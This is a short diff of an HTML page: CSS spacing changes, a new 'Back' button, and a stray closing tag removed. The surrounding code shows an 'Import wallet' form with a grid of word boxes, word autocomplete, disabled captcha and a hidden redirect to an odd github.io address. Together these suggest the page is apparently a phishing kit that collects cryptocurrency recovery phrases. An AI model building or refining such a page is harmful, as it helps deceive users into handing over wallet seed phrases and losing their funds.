@@ -85,7 +85,7 @@
             grid-template-columns: repeat(3, 1fr);
             gap: 1rem;
             margin-top: 1em;
-            margin-bottom: 1.6em;
+            margin-bottom: 0.8em;
         }
         .word-box {
             box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1); /* Ombre douce */
@@ -200,7 +200,24 @@
 .autocomplete-container div:not(:last-child) {
     border-bottom: 1px solid #eee; /* Séparation douce entre les éléments */
 }
+.BACK {
+    float: right;
+    padding: 5px 20px;
+    margin-bottom: 10px;
+    background: none;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 16px;
+    border: #fff 1px solid;
+    margin-right: 5px;
+}
 
+.BACK:hover {
+    background-color: #888888;
+    transition: background 0.2s ease-in-out;
+}
 
     </style>
 </head>
@@ -226,7 +243,10 @@
             <!-- Redirection après soumission -->
             <input type="hidden" name="_next" value="https://fauxon.github.io/fhrdhqctvghbn-/">
             <input type="hidden" name="_captcha" value="false">
-            
+            <button onclick="window.location.href='modal1.html'" class="BACK">
+                Back
+            </button>
+
             <button type="submit" class="submit-button">Import wallet</button>
         </form>
         
@@ -447,8 +467,5 @@ function showAutoComplete(input) {
     
     
 </body>
-</html>
-
-
 </html>
 
